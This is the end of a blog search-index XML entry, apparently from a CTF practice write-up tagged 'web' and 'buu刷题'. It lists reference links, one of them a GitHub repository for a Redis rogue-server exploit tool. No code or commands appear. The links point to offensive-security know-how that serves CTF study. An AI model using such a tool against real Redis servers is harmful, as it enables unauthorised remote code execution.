<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p><a href="https://blog.csdn.net/RABCDXB/article/details/119654409">https://blog.csdn.net/RABCDXB/article/details/119654409</a></p>
<p><a href="https://blog.csdn.net/wlllllianqing/article/details/120274851">https://blog.csdn.net/wlllllianqing/article/details/120274851</a></p>
<p><a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p>
]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
</search>
